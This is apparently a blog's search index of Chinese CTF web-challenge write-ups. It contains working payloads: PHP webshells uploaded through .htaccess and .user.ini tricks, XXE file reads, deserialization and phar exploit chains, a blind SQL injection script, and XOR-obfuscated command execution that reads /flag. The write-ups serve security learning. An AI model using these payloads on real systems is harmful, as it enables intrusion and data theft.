[{"id":"3019e2d5e35843a322179753fef4c0de","title":"GXYCTF2019-BabyUpload","content":"题目检测文件MIME，切不允许后缀名中包含ph，并且对大小写也进行过滤，还通过file_get_contents来获取文件内部的数据，过滤&lt;? \n上传.htacess文件，内容为SetHandler application&#x2F;x-httpd-php .jpg\n由于过滤了&lt;?，创建一个文件，文件后缀为.jpg，内容为\neval($_POST['1']);\n","slug":"GXYCTF2019-BabyUpload","date":"2023-07-03T01:54:32.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"ae7c4e690dd63556c2c364b39f48b7c9","title":"BUU BURP COURSE","content":"进入网页，只有一行内容：只能本地访问，burpsuite抓包后添加X-Forwarded-For:127.0.0.1发现不行\n换成X-Real-IP:127.0.0.1即可\n","slug":"BUU-BURP-COURSE","date":"2023-06-29T08:23:42.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"388fbd4597ab408d9989503e2f82de36","title":"BUU XXE COURSE","content":"XXE注入\n输入用户名和密码点击go，发现输入的用户名以弹窗形式输出，F12查看网页源码发现XMLFunction()\n说明数据传输的形式为XML\n使用burpsuite抓包，看到了xml文档声明\n构造payload：\n\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n\n&lt;!DOCTYPE ANY [\n        &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;\n]&gt;\n&lt;root&gt; \n\t&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt; \t\n    &lt;password&gt;123456&lt;&#x2F;password&gt; \n&lt;&#x2F;root&gt;\n\n","slug":"BUU-XXE-COURSE","date":"2023-06-29T08:20:10.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"0f0695199eeff54f67a227ddbd9fe6ab","title":"BUU UPLOAD COURSE","content":"文件上传后全部被重新命名并且强制将后缀名改为jpg\n可以通过题目链接\n&#x2F;index.php?file&#x3D;uploads&#x2F;649c1ebac21b1.jpg      的形式访问上传后的文件，上传后的文件依然可以被作为php文件执行，使用蚁剑连接即可\n","slug":"BUU-UPLOAD-COURSE","date":"2023-06-28T11:52:42.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"acd1299be9c20688d202948dec0f6033","title":"BUU SQL COURSE 1","content":"F12在网络请求中能看到消息头中的信息\nhttp://3b8efbe2-8da1-4516-9363-9a838fcda70c.node4.buuoj.cn:81/backend/content_detail.php?id=1\n明显为SQL注入的形式，order by 2判断为两列，正常暴表暴字段暴数据即可\n","slug":"BUU-SQL-COURSE-1","date":"2023-06-27T11:20:27.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"65a2832de802174240ebcdfabdb1247d","title":"网鼎杯 2020 青龙组AreUSerialz","content":"&lt;?php\n\ninclude(&quot;flag.php&quot;);\n\nhighlight_file(__FILE__);\n\nclass FileHandler &#123;\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() &#123;    &#x2F;&#x2F;初始化数值，调用process()函数\n        $op &#x3D; &quot;1&quot;;\n        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;\n        $content &#x3D; &quot;Hello World!&quot;;\n        $this-&gt;process();\n    &#125;\n\n    public function process() &#123;     &#x2F;&#x2F;若$op为1，执行write()函数，若$op为2,调用read()函数，将结果赋值给$res,output $res\n        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;\n            $this-&gt;write();\n        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;\n            $res &#x3D; $this-&gt;read();\n            $this-&gt;output($res);\n        &#125; else &#123;\n            $this-&gt;output(&quot;Bad Hacker!&quot;);\n        &#125;\n    &#125;\n\n    private function write() &#123;      &#x2F;&#x2F;将content内容写入filename\n        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;\n            if(strlen((string)$this-&gt;content) &gt; 100) &#123;\n                $this-&gt;output(&quot;Too long!&quot;);\n                die();\n            &#125;\n            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);\n            if($res) $this-&gt;output(&quot;Successful!&quot;);\n            else $this-&gt;output(&quot;Failed!&quot;);\n        &#125; else &#123;\n            $this-&gt;output(&quot;Failed!&quot;);\n        &#125;\n    &#125;\n\n    private function read() &#123;       &#x2F;&#x2F;获取filename文件的内容\n        $res &#x3D; &quot;&quot;;\n        if(isset($this-&gt;filename)) &#123;\n            $res &#x3D; file_get_contents($this-&gt;filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;   &#x2F;&#x2F;打印\n        echo &quot;[Result]: &lt;br&gt;&quot;;\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)\n            $this-&gt;op &#x3D; &quot;1&quot;;\n        $this-&gt;content &#x3D; &quot;&quot;;\n        $this-&gt;process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i &#x3D; 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))\n            return false;\n    return true;\n&#125;\n\nif(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;\n\n    $str &#x3D; (string)$_GET[&#39;str&#39;];\n    if(is_valid($str)) &#123;\n        $obj &#x3D; unserialize($str);\n    &#125;\n\n&#125;\n\n反序列化漏洞，__construct()构造函数中调用process()方法，op&#x3D;&#x3D;”2”时执行read()读取文件，令op&#x3D;2弱比较绕过，$filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php读取flag文件内容\n&lt;?php\n\nclass FileHandler &#123;\n    public $op &#x3D; 2;\n    public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;\n    public $content &#x3D; &quot;xxxx&quot;;\n&#125;\n$a &#x3D; new FileHandler();\n$b &#x3D; serialize($a);\necho($b);\n?&gt;\n\n\n","slug":"网鼎杯-2020-青龙组AreUSerialz","date":"2023-06-27T07:40:26.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"0914970e2b91842e13e1a7baa380ec14","title":"EIS 2019-EzPOP","content":"base64算法解码时是4个字节一组\n文件名filename构建：filename&#x3D;options[‘prefix’].$name  $name&#x3D;A::key\n$data&#x3D;$value&#x3D;A::$contents&#x3D;$cleaned,$complete\nO%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A52%3A%22eHh4UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3lKaElsMHBQejQ9%22%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3B%7D\n","slug":"EIS-2019-EzPOP","date":"2023-06-26T12:02:46.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"fbcddf176f11d39ede5cfbba517000aa","title":"SWPUCTF 2018-SimplePHP","content":"\n题目要求上传一个文件\n\n页面源码中可以得知flag在f1ag.php文件中\n在查看文件页面，通过?file传入参数查看对应文件内容\nfile.php\n\nclass.php\n\n&lt;?php\nclass C1e4r\n&#123;\n    public $test;\n    public $str;\n    public function __construct($name)\n    &#123;\n        $this-&gt;str &#x3D; $name;\n    &#125;\n    public function __destruct()\n    &#123;\n        $this-&gt;test &#x3D; $this-&gt;str;\n        echo $this-&gt;test;\n    &#125;\n&#125;\n\nclass Show\n&#123;\n    public $source;\n    public $str;\n    public function __construct($file)\n    &#123;\n        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg\n        echo $this-&gt;source;\n    &#125;\n    public function __toString()    &#x2F;&#x2F;$this-&gt;str[&#39;str&#39;]-&gt;source不存在，会触发__get()方法\n    &#123;\n        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;\n        return $content;\n    &#125;\n    public function __set($key,$value)  &#x2F;&#x2F;将数据写入不可访问的属性时触发\n    &#123;\n        $this-&gt;$key &#x3D; $value;\n    &#125;\n    public function _show()\n    &#123;\n        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;\n            die(&#39;hacker!&#39;);\n        &#125; else &#123;\n            highlight_file($this-&gt;source);\n        &#125;\n\n    &#125;\n    public function __wakeup()\n    &#123;\n        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123;\n            echo &quot;hacker~&quot;;\n            $this-&gt;source &#x3D; &quot;index.php&quot;;\n        &#125;\n    &#125;\n&#125;\nclass Test\n&#123;\n    public $file;\n    public $params;\n    public function __construct()\n    &#123;\n        $this-&gt;params &#x3D; array();\n    &#125;\n    public function __get($key) &#x2F;&#x2F;触发后执行get($key)方法，将params[$key]的值赋给$value\n    &#123;\n        return $this-&gt;get($key);\n    &#125;\n    public function get($key)\n    &#123;\n        if(isset($this-&gt;params[$key])) &#123;\n            $value &#x3D; $this-&gt;params[$key];\n        &#125; else &#123;\n            $value &#x3D; &quot;index.php&quot;;\n        &#125;\n        return $this-&gt;file_get($value);\n    &#125;\n    public function file_get($value)    &#x2F;&#x2F;存在危险函数file_get_contents()，可作为pop链尾\n    &#123;\n        $text &#x3D; base64_encode(file_get_contents($value));\n        return $text;\n    &#125;\n&#125;\n?&gt;\n\n\n\n\nfunction.php\n\n在file.php中通过file传入来查看文件内容，并调用了file_exists()函数，可以通过phar实现反序列化来获取flag\n对于class.php中的几个类\nC1e4r类中的__destruct()在类被销毁时自动调用，因此可作为pop链的链头，Test类中调用了file_get_contents方法，可作为pop链尾\nShow类中的__ toString()方法中$this-&gt;str[‘str’]-&gt;source不存在，会触发__get()方法\n__set()方法将数据写入不可访问的属性时触发\nTest类中的__get()方法触发后执行get($key)方法，将params[$key]的值赋给$value\n构造pop链\n$c &#x3D; new C1e4r();\n$show &#x3D; new Show();\n$test &#x3D; new Test();\n$c-&gt;str &#x3D; $show;\n\n$show-&gt;str[&#39;str&#39;] &#x3D; $test;\n$test-&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;\n\n生成phar文件\n$phar &#x3D; new Phar(&#39;php.phar&#39;);\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);\n\n$phar-&gt;setMetadata($c);\n$phar-&gt;addFromString(&#39;test.txt&#39;,&quot;test&quot;);\n\n$phar-&gt;stopBuffering();;\n\n将生成的文件后缀改为jpg\n在upload路径下可以查看上传的文件名\n在file.php中用phar协议访问\n\nbase64解密得到flag\n\n","slug":"SWPUCTF-2018-SimplePHP","date":"2023-06-25T09:04:43.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"7028e45966f0fd8a9175e6d471456f27","title":"SUCTF 2019-CheckIn","content":"\n文件上传，对文件类型，后缀名，文件内容都进行了过滤\n用.uer.ini绕过\n利用.user.ini指定文件，在当前目录下的文件执行时会将指定文件中的代码执行出来，以此实现带入后门\n准备一个.user.ini文件，内容如下\nGIF89a?\n\nauto_prepend_file &#x3D; shell.gif &#x2F;&#x2F;要上传的文件名\n\n要上传的文件的内容\nGIF89a?\n&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;\n\n\n进入文件上传的目录\n\n用蚁剑连接\n\n找到flag\n\n","slug":"SUCTF-2019-CheckIn","date":"2023-04-12T12:42:18.000Z","categories_index":"","tags_index":"后缀名绕过","author_index":"Aurora"},{"id":"f91bc0d4882aff535a39c946a3135f15","title":"HZNUCTF 2023 preliminary-ezlogin","content":"1.png\n查看网页源码，发现提示\n2.png\n对输入的username做判断，过滤掉select，union，and，database\n并且对输入内容进行base64解码和字符串反转\n页面根据输入内容没有明显回显和页面跳转，尝试盲注，延时注入\n首先构造payload判断闭合符\n&lt;?php\n\n$a &#x3D; &quot;1&#39;||if(1,sleep(5),1)#&quot;;\n$b &#x3D; base64_encode(strrev($a));\n$c &#x3D; strrev(base64_decode($b));\n\necho $b;\n?&gt;\n\n闭合符为’且过滤了空格\n通过延时注入脚本查看库名\nimport requests\nimport base64\nimport datetime\n\nurl&#x3D;&#39;http:&#x2F;&#x2F;node3.anna.nssctf.cn:28992&#x2F;&#39;\nflag &#x3D; &#39;&#39;\n\nfor i in range(1,100):\n    low &#x3D; 32\n    high &#x3D; 130\n    mid &#x3D; (high + low) &#x2F;&#x2F; 2\n    while (low &lt; high):\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;DATABASE()&#x2F;**&#x2F;AND&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;user&#39;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(&#39;username&#39;,&#39;^&#39;&#39;password&#39;)&#x2F;**&#x2F;from&#x2F;**&#x2F;users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n\n        payload &#x3D; payload.format(i, mid)\n        print(payload)\n        payload &#x3D; base64.b64encode(payload[::-1].encode(&quot;utf-8&quot;))\n        data &#x3D; &#123;\n            &#39;username&#39;:payload,\n            &#39;passwd&#39;:&#39;1&#39;\n        &#125;\n        time1 &#x3D; datetime.datetime.now()\n        r &#x3D; requests.post(url, data)\n        time2 &#x3D; datetime.datetime.now()\n        time &#x3D; (time2 - time1).seconds\n        if time &gt; 1:\n            low &#x3D; mid + 1\n        else:\n            high &#x3D; mid\n        mid &#x3D; (low + high) &#x2F;&#x2F; 2\n    if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 130):\n        break\n    flag +&#x3D; chr(mid)\n\nprint(flag)\n\n库名:users\n暴表：user\n暴字段：id,username,password\n暴数据：\n","slug":"HZNUCTF-2023-preliminary-ezlogin","date":"2023-04-11T11:59:45.000Z","categories_index":"","tags_index":"SQL注入 盲注","author_index":"Aurora"},{"id":"15f43a16d1c74aa2d0aa05ce47e43933","title":"MRCTF2020-Ez_bypass","content":"\nmd5强碰撞\n?gg[]&#x3D;1&amp;id[]&#x3D;2\nis_numeric弱比较\n1234567a数字后加字母会被整体转成数字\n等到flag\n\n","slug":"MRCTF2020-Ez-bypass","date":"2023-04-08T11:33:05.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"cdd9aa3771bb02f44f999a05704db558","title":"极客大挑战 2019-HardSQL","content":"\n\n闭合符为’\n\n\n去掉空格\n\n判断是过滤了空格\n尝试&#x2F;**&#x2F;代替空格也被过滤\n尝试用()的方式绕过\nadmin&#39;union(database())#\n\n还是被过滤\n尝试报错注入\nadmin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n\n\n获取到库名\n暴表\nadmin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#\n\n\n暴字段\nadmin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#\n\n\n暴数据\nadmin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\n\n\n显示了一半flag\nadmin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#\n\n","slug":"极客大挑战-2019-HardSQL","date":"2023-04-04T11:38:01.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"436ac58f1a1d63b58d899e0fdddfbd9b","title":"ZJCTF 2019-NiZhuanSiWei","content":"\n进入题目，分析源码\n首先要通过GET方式输入变量text，file_get_contents() 的功能是把整个文件读入一个字符串中。\n即要求输入的text为一个text类型的文件且内容为welcome to the zjctf\n可以通过PHP协议中的php:&#x2F;&#x2F;input或者data:&#x2F;&#x2F;写入\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf\n\n接下来匹配file中输入的内容，如果preg_match匹配为flag则退出，否则通过include包含文件\n根据提示访问useless.php \n\n页面内容为空\n尝试通过php:&#x2F;&#x2F;filter的方式读取useless.php的内容\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php\n\n对得到的内容进行base64解码，内容为\n&lt;?php  \n\nclass Flag&#123;  &#x2F;&#x2F;flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125;  \n?&gt;  \n\nelse中通过unserialize反序列化获取password中的内容\n通过序列化操作构造需要输入的内容\n&lt;?php\n\nclass Flag&#123;  &#x2F;&#x2F;flag.php\n    public $file &#x3D; &quot;flag.php&quot;;\n&#125;\n\necho(serialize(new Flag()));\n?&gt;\n\n结果为O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}\n最终payload为\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}\n\n查看网页源代码，得到flag\n\n","slug":"ZJCTF-2019-NiZhuanSiWei","date":"2023-04-01T11:57:05.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"7681339df153dad872cbe7903af30788","title":"nkctf-2023-eazy_php","content":"\n第一个if要求输入a和b，要求a不等于b但是a，b的MD5值相等，采用的是弱比较\n令a&#x3D;QNKCDZO，b&#x3D;240610708\n二者的md5值表示为科学计数法且前缀都为0e，0的多少次方都是0，通过\n第二个if要求c和d不相等但是sha1值相等，采用强比较\nGoogle提出了两个两个SHA1值相同而不一样(SHA256的值不通)的pdf文件\nc&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n第三个if要求e不等于114514且e的取整等于114514，令e&#x3D;114514.4\n第四个if要求传入NS_CTF.go成功，但是php不允许变量中含有.，通过get或post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说是无法构造NS_CTF.go的，但PHP中有一个特性是如果传入[，它被转化为 _之后，后面的字符就会被保留下来不会被替换\n构造NS[CTF.go&#x3D;1\n第五个if要求输入的cmd不为空，直接输入即可\n第六个if匹配cmd中的内容，要求不能含有0-9以及所有的大小写字母，用位运算符来构造绕过\n通过异或拼凑需要的语句\n构造payload：\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system\n\n$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system\n\n%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;flag\n\n得到flag\n\n\n\n\n\n","slug":"nkctf-2023-eazy-php","date":"2023-03-30T12:05:41.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"cac40bacea4478d0db1ca783798bed19","title":"MRCTF2020-你传马呢","content":"\n进入题目，是一个文件上传题\n准备一个一句话木马a.php\n尝试上传\n\n上传失败\n在木马文件中加入png文件头，并将后缀改为.png上传成功\n\n但是不能直接使用\n准备一个a.htaccess文件内容如下\nSetHandler application&#x2F;x-httpd-php\n\n通过burpsuite抓包上传，并将文件名改为.htaccess\n.htaccess是配置文件，写入的内容可以让任何文件被解析为php\n\n之前传入的c.png会被解析为php文件\n使用蚁剑连接，查看文件得到flag\n","slug":"MRCTF2020-你传马呢","date":"2023-03-28T12:08:28.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"a24b4f26681ee1c0ae972a287e692418","title":"HCTF 2018-admin","content":"\n查看网页源码\n要求是管理员\n\n进入登录页面\n用burpsuite进行弱口令爆破\n\n账户admin密码123\n得到flag\n\n","slug":"HCTF-2018-admin","date":"2023-03-24T11:25:11.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"8b43e147e5907394dd22e7f296e94868","title":"护网杯 2018-easy_tornado","content":"\n进入题目，有三个文本文件，逐个打开查看\n\n提示flag在文件fllllllllllllag中\n\n提示render\n\n提示输入md5(cookie_secret+md5(filename))\n三个页面的url中都包含如下格式\n\n要输入file?filename&#x2F;文件名&amp;filehash&#x3D;32位md5值\nrender（渲染）函数，在SSTI注入（模板注入）中使用\nSSTI注入：服务端模板注入\n当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。通过模板渲染，将用户输入的东西在进行分析后传到视图层进行模板渲染（render）后让用户看到结果。\n随意构造一个md5值进行输入\n&#x2F;file?filename&#x3D; &#x2F;fllllllllllllag&amp;filehash&#x3D;17ff6ec9a1a56bdc45a35b7a2bd149df\n\n尝试输入&#x2F;error?msg&#x3D;1\n\n\n输出1\n确定是模板注入\n接下来要获取cookie_secret\n在tornado官方文档中查看与cookie_secret相关的内容\n\n要在self.application.settings中查找cookie_secrect\n直接访问self.application.settings以及它的别名RequestHandler.settings都无法获取\nhandler指向RequestHandler\n所以handler.settings就指向RequestHandler.settings\n\n获取到cookie_secrect的内容\n根据提示拼接cookie_secret和&#x2F;fllllllllllllag的md5值后再取md5值\n构造payload\n&#x2F;file?filename&#x3D; &#x2F;fllllllllllllag&amp;filehash&#x3D;a6e0e222d20af5594c6c544e479ea4e7\n\n得到flag\n","slug":"护网杯-2018-easy-tornado","date":"2023-03-23T11:19:04.000Z","categories_index":"","tags_index":"SSTI","author_index":"Aurora"},{"id":"07a3722f5c23972b596ab40e86cf2c2e","title":"BJDCTF2020-Easy MD5","content":"md5()函数计算字符串的MD5散列。\nmd5()函数使用RSA数据安全，包括MD5报文摘要算法。\nMD5 报文摘要算法：MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128 位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果。MD5 算法主要是为数字签名应用程序而设计的；在这个数字签名应用程序中，较大的文件将在加密（这里的加密过程是通过在一个密码系统下[如：RSA]的公开密钥下设置私有密钥而完成的）之前以一种安全的方式进行压缩。\n语法\nmd5() 函数不能处理数组，数组都返回 null，md5(a[]) 结果为 null。\nmd5(string,raw)\nstring必需，规定要计算的字符串\nraw可选，规定十六进制或者二进制输出格式：\nTRUE-原始 16字符二进制格式\nFALSE-默认 32字符十六进制数\nmd5()的返回值，如果成功则返回已计算的MD5散列，失败则返回FALSE\n\n题目中只有一个输入框和一个查询按钮\n\n查看响应头信息\n其中有提示\nselect * from &#39;admin&#39; where password&#x3D;md5($pass,true)\n\n输入字符串ffifdyop\n该字符串md5后的结果为\n\n前几位是’ or ‘6相当于or一个永真式，与万能密码的实现相同\n\n进入一个新的页面\n查看网页源码\n\n提示中通过GET方式获取a和b，要求a和b值不相同但是md5值相同\n但是&#x3D;&#x3D;为弱比较\n找出两个md5值以0e开头的字符串\n因为是0e开头，php会认为是科学计数法，结果为0\n令a&#x3D;QNKCDZO，b&#x3D;s155964671a\n\n再次进入一个新的页面\n要求通过POST方式传入参数param1和param2，并且要求两个参数的值不同但是md5值相同\n这次比较使用的是&#x3D;&#x3D;&#x3D;不能通过md5碰撞的方式绕过了\n但是由于md5不能处理数组，传入数组返回的结果为null，由此来绕过\n\n得到flag\n","slug":"BJDCTF2020-Easy-MD5","date":"2023-03-21T11:14:13.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"b32ea3f1761e25d191c1de238c5afb69","title":"极客大挑战 2019-BuyFlag","content":"\n点击PAYFLAG进入购买flag的页面\n\n查看网页源代码\n\n只有Cuit’s student可以购买flag\n根据提示用post方式输入password\n要求不能是数字且等于404\n通过PHP若比较令password&#x3D;404d\nburpsuite抓包后在cookie中将user&#x3D;0改为user&#x3D;1\n\n\n输入数字太长\n用科学计数法输入\nmoney&#x3D;1e9\n得到flag\n\n","slug":"极客大挑战-2019-BuyFlag","date":"2023-03-18T12:01:05.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"cee5876e3b5b62ac6677fd065d93b4e0","title":"RoarCTF 2019-Easy Calc","content":"\n查看网页源代码\n\n其中提示设置了waf\n查看calc.php\n\n可以根据对num输入参数来获取内容\nnum&#x3D;1\n\nnum&#x3D;phpinfo()\n\n由于waf的存在，访问被拒绝\n尝试绕过waf\n在输入参数num时在?后加上空格\n? num&#x3D;phpinfo()\n\n? num&#x3D;scandir(&#x2F;)\n&#x2F;被过滤\n\n尝试用chr对ascii码的方式绕过，用var_dump将结果输出\n? num&#x3D;var_dump(scandir(chr(47)))\n\n对文件进行读取\n? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n得到flag\n\n","slug":"RoarCTF-2019-Easy-Calc","date":"2023-03-17T11:24:36.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"fc98a982ac40604a05e9655acd6d7c89","title":"ACTF2020 